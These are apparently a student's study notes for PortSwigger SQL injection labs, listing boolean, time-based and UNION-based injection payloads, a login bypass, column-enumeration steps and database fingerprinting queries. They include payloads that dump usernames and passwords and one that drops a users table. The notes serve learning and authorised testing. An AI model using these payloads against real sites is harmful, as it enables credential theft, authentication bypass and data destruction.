# Injection Examples: [Lab-Solutions](https://github.com/IOxCyber/CyberEssentials/blob/f759882896be05d29c88b3d7bc31fc83759afab3/Security-Tools/Burp_Suite/PortSwigger-WebSecAcad/Web_Vuln-Insights/SQL%20Injection/SQLi_Labs.md)

## A. `Retrieving hidden data`, where you can modify a SQL query to return additional results. #Lab-1

### 1. Testing for boolean-based attacks:
- Original Query: `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
- Modified: ![image](https://github.com/user-attachments/assets/e4236490-1079-4f23-92c9-a4097f63a50c)
- Query to executed by DB after injections: `SELECT * FROM products;`

### Injections:
- `'OR '1'='1` - This payload appends an OR condition that always evaluates to true.
- `'OR 1=1 --` - This payload appends an OR condition that always evaluates to true, commenting out the remaining portion of the original query.
- `'OR 'x'='x` - This payload compares a string with itself, resulting in a true condition.

### 2. Testing for time-based attacks:
- `'OR SLEEP(5) --` - This payload tries to induce a delay of 5 seconds in the SQL query execution by using the SLEEP function. If the website is vulnerable, it will take longer to respond.
- `'OR BENCHMARK(10000000,SHA1(1)) --` - This payload attempts to measure the time taken to execute the SHA1 function a large number of times, causing a significant delay if the SQL injection is successful.

### 3. Testing for error-based attacks:
- `'OR 1=1; DROP TABLE users; --` - This payload combines a valid condition (1=1) with a malicious action (DROP TABLE users), potentially causing an error and deleting the "users" table.
-  `'OR 1=1 UNION ALL SELECT NULL, CONCAT(username,':', password) FROM users --` - This payload attempts to perform a UNION-based SQL injection to retrieve the usernames and passwords from the "users" table.

---
---

## B. `Subverting/interfering with application logic`, change a query to interfere with the application's logic. #Lab-2
- Testing on a login page involves attempting to subvert the application logic and bypass the authentication mechanism
- `SELECT * FROM users WHERE username = 'administrator'--' AND password = ''` commenting out the remaining portion of the original query.

---
---

# UNION Attack

## C. UNION attacks `to combine the result sets of two or more SELECT statements in a single SQL query`

### 1. `Retrieve data from different database tables.`
- eg. `SELECT a, b FROM table1 UNION SELECT c, d FROM table2`

## NOTE: For a Union Query to work: Both queries should `Return same number of Columns, Data type must be compatiable.`

### Example
1. Original Query: `SELECT * FROM users WHERE username = 'input_username' AND password = 'input_password';`

2. Injection: `username ' UNION SELECT null, table_name FROM information_schema.tables --` (-- to comment out rest of the original query)

3. Modified Query: `SELECT * FROM users WHERE username = '' UNION SELECT null, table_name FROM information_schema.tables --' AND password = 'input_password';`

### 2. Determining the `number of columns being returned from the original query` #LAB-3
- Motive: Determine the Columns Numbers > 

- Method 1: `injecting a series of ORDER BY clauses and incrementing` the specified column index until an error occurs.
> `ORDER BY` clause in SQL is used to sort the result set of a query by one or more columns.
```
eg.
SELECT * FROM employees WHERE age > 25 ORDER BY salary DESC;

' ORDER BY 1--    **It means to sort the table by column 1**
' ORDER BY 2--
' ORDER BY 3--
etc.
```
- Method 2: Submitting a series of `UNION SELECT` payloads specifying a different number of null values.
> NULL is convertible to every common data type, so it maximizes the chance that the payload will succeed.
```
eg.

' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.
```

### Finding columns with a useful data type eg. TEXT #Lab-4
- `After we determine the number of returning columns, we can probe each column to test whether it can hold string data.`
- We can submit a series of UNION SELECT payloads that place a string value into each column.
```
eg.

' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```
> If the column data type is not compatible with string data, the injected query will cause a database error.


### Using a SQL injection UNION attack `to retrieve column(s) that can hold string Text`: #LAB-5
- Once, we determined the `number of columns returned` by the original query and found which `columns can hold string data`, you are in a position to retrieve interesting data.
```
eg.

The original query returns two columns, both of which can hold string data.
The injection point is a quoted string within the WHERE clause.
The database contains a table called users with the columns username and password.

In this example, you can retrieve the contents of the `users` table by submitting the input:

' UNION SELECT username, password FROM users--
```
> To perform above attack, we need to know that there is a `table USERS with two columns` called `username and password.`

### Retrieving multiple values within a single column: #LAB-6
- Can `retrieve multiple values together within this single column by concatenating the values` together.
- determine the No. of columns > determine which column allows TEXT values > retrieve Multiple TEXT values in a single Column.
- Oracle DB Injection: `' UNION SELECT username || '~' || password FROM users--`


### `Examining/Determining the database` in SQL injection attacks #Lab-7
- This includes `type and version` and `tables and columns` that the database contains.
- We can potentially identify both the database type and version by injecting provider-specific queries to see if one works.

- Type: Can be determined by `Comments` when we run a query
```
Eg.

Database type    	Query
Microsoft, MySQL	SELECT @@version
Oracle	          SELECT * FROM v$version
PostgreSQL	      SELECT version()

Comments:
Oracle	--comment

Microsoft	--comment /*comment*/

PostgreSQL	--comment /*comment*/

MySQL: #comment -- comment [Note the space after the double dash] /*comment*/
```

### Listing the contents of the database:
- Most database types (except Oracle) have a set of views called the information schema.
- To List the tables in DB: `SELECT * FROM information_schema.tables`
- Then, To list the columns in individual tables: `SELECT * FROM information_schema.columns WHERE table_name = 'Users'`


---
---
/*The NEXT*/












